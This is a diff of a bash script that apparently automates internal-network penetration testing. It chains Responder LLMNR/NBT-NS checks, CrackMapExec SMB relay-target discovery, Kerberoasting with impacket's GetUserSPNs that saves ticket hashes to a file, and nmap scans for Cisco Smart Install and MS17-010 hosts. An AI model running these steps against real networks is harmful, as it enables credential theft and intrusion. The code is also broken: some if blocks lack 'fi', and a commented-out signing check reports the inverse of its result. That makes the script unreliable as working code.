@@ -6,7 +6,7 @@ function smbRelay() {
     # for open TCP/445 and uses CME's gen-relay-list to get a list of targets.
     SMBRELAYPROTOS=false            # Setup vars to use in final comparison
     SMBRELAYMESSAGESIGNING=false
-    echo "How long do you want to wait for LLMNR/NBT-NS traffic (seconds)?"
+    echo "How long do you want to wait for LLMNR/NBT-NS traffic (seconds)?" # I'd recommend waiting at least 180 seconds (3mins)
     read -p "Seconds: " DURATION # Ideally I'd watch Responder's output for a request to come through, but this will do for now
     echo "[+] Checking for LLMNR & NBT-NS. I'll be back in $DURATION seconds..."
     (python /opt/Responder/Responder.py -I eth0 -A &) &> /dev/null # Spawn Responder in analyze mode and mute output
@@ -42,14 +42,15 @@ function smbRelay() {
                      if [ "$SMBRELAYMESSAGESIGNING" == "True" ]; then
                          echo "[!] SMB relaying looks like a valid vector! Let's do it!"
                      else
-                         echo "[-] LLMNR is present, but we couldn't find hosts to relay to :("
+                         echo "[-] LLMNR/NBT-NS is present, but we couldn't find hosts to relay to :("
                      fi
                  else
-                     echo "[-] LLMNR and NBT-NS weren't detected :("
+                     echo "[-] LLMNR and NBT-NS weren't detected and we couldn't find hosts with SMB signing disabled :("
                  fi
                  ;;
-          n|N ) echo "no";;
-          * ) echo "invalid";;
+          n|N ) echo "[-] Exiting..."
+                exit 1;;
+          * ) echo "[-] Please choose 'y' or 'n'";;
         esac
     fi
     #*** Called this same function in the earlier logic. Can I just make this its own function?
@@ -82,9 +83,9 @@ function smbRelay() {
 function kerberoast() {
   # Collects kerberos SPNs after getting information about the user to use
   echo "[+] We'll need some information first:"
-  echo "What is the name of the domain? (ex. ad.example.com):"
+  echo "[+] What is the name of the domain? (ex. ad.example.com):"
   read -p "Domain: " KERBDOMAIN
-  echo "What domain user would you like to use? (ex. jdoe):"
+  echo "[+] What domain user would you like to use? (ex. jdoe):"
   read -p "Username: " KERBUSER
   python /opt/impacket/examples/GetUserSPNs.py -dc-ip $KERBDOMAIN -request $KERBDOMAIN/$KERBUSER -outputfile kerberos-hashes.txt > kerberoast-output.tmp
   cat kerberoast-output.tmp | grep -v "Error" > kerberoast-users.txt
@@ -100,7 +101,7 @@ function smartInstall() {
   nmap -p4786 -iL $1 -oG open4786.gnmap
   grep "Host:" open4786.gnmap | grep "4786/open/tcp" | awk '{print $2}' > open4786.txt
   if [[ $(wc -l <open4786.txt) -gt 0 ]]; then
-    echo "[+] Found `wc -l <open4786.txt` hosts with port 4786 open!";
+    echo "[!] Found `wc -l <open4786.txt` hosts with port 4786 open!";
   else
     echo "[-] Didn't find any hosts with port 4786 open :("
 }
@@ -139,7 +140,7 @@ function ms17-010() { #*** Need to confirm this actually works...
   echo "[+] Parsing nmap output for vulnerable systems"
   grep -B 7 VULNERABLE: MS17-010.nmap| grep "Nmap scan report for" | awk '{print $5}' > MS17-010-vulnhosts.lst #*** Assumed syntax. Need to confirm
   if [[ $(wc -l <MS17-010-vulnhosts.lst) -gt 0 ]]; then
-    echo "[+] Found `wc -l <MS17-010-vulnhosts.lst` hosts vulnerable to MS17-010";
+    echo "[!] Found `wc -l <MS17-010-vulnhosts.lst` hosts vulnerable to MS17-010!";
   else
     echo "[-] Didn't find any hosts vulnerable to MS17-010 :("
 }
@@ -150,4 +151,21 @@ function ms17-010() { #*** Need to confirm this actually works...
 #    DOMAIN=`grep "search" /etc/resolv.conf | awk '{print $2}'` # Get domain from resolv.conf
 #    #*** Add reverse DNS w/ dnsrecon/dnsenum
 #    #*** Parse collected IPs, split to /24s, dedup, then store in a file
+#}
+
+#function smbMessageSigning() {
+#  if [ ! -f open445.txt ]; then
+#    echo "[+] Using masscan to check for open port 445..."
+#    masscan -p445 -iL $1 -oG open445.txt # Massscan over Nmap here in case larget subnets are used
+#    grep "Host" open445.txt | awk '{print $2}' > open445.tmp && mv open445.tmp open445.txt # Parse out  IP addresses
+#  else
+#    echo "[+] Found file of hosts with port 445 open!"
+#  fi
+#  cme smb open445.txt --gen-relay-list SmbSigningDisabled.txt # Use CME to check for SMB signing
+#  if [[ $(wc -l <SmbSigningDisabled.txt) -gt 0 ]]; then
+#    echo "[+] SMB signing is enabled!";
+#    SMBRELAYMESSAGESIGNING=true
+#  else
+#    echo "[-] SMB signing is disabled :("
+#  fi
 #}
